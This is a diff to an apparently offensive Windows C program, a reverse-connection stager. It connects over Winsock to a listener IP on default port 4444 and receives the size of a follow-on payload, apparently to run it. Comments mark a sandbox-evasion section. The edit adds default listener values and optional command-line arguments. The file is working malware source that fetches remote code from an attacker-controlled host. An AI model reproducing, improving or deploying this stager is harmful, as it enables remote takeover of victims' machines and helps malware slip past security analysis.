@@ -96,16 +96,15 @@ char* rev(char* str)
 }
 
 
-int main(int argc) {
+int main(int argc, char *argv[]) {
 	ULONG32 size;
 	char * buffer;
 	void (*function)();
 	winsock_init();
-	char argv[3][25];
 
 	//this program was meant to be run from the command line, so i added this so it would work
-	strcpy(argv[1],"ListenerIP");
-	strcpy(argv[2],"ListenerPort");
+	char * defaultListenerIP = "ListenerIP";
+	unsigned int defaultListenerPort = 4444;
 
 	//================================
 	//begin sandbox evasssioooooon
@@ -127,7 +126,13 @@ int main(int argc) {
 	//=================================
 
 	//start the socket homie
-	SOCKET my_socket = wsconnect(argv[1], atoi(argv[2]));
+	SOCKET my_socket;
+	//If command line parameters are given, use those instead of defaults.
+	if(argc == 3){
+		my_socket = wsconnect(argv[1], atoi(argv[2]));
+	}else{
+		my_socket = wsconnect(defaultListenerIP, defaultListenerPort);
+	}
 	//receive 4 bytes which indicates the size of the next payload
 	int count = recv(my_socket, (char *)&size, 4, 0);
 	//check for issues
